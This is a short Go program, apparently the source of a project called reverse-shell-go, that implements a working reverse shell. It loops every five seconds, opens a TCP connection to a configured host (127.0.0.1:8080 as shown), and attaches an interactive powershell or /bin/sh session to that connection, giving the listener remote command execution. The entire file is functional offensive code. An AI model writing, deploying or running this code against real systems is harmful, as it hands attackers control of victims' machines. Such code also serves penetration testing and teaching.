package main

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"time"
)

const delay = 5
const host = "127.0.0.1:8080"

func main() {
	fmt.Println("github.com/orf1/reverse-shell-go")
	for {
		time.Sleep(delay * time.Second)
		connect()
	}
}

// connect attempts to send a shell to a remote server
func connect() {
	// attempts to establish a tcp connection with server
	fmt.Println("attempting to establish tcp connection with server")
	con, err := net.Dial("tcp", host)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("connection established")

	cmd := getOsCmd()

	// binds stdin, stdout, and stderr to connection
	fmt.Println("binding standard interfaces to connection")
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con

	// opens shell
	fmt.Println("shell opened")
	err = cmd.Run()
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("shell closed")
}

func getOsCmd() *exec.Cmd {
	fmt.Println("detecting operating system")
	if runtime.GOOS == "windows" {
		fmt.Println("detected windows, using powershell")
		return exec.Command("powershell")
	} else {
		fmt.Println("detected mac or linux, using /bin/sh")
		return exec.Command("/bin/sh", "-i")
	}
}
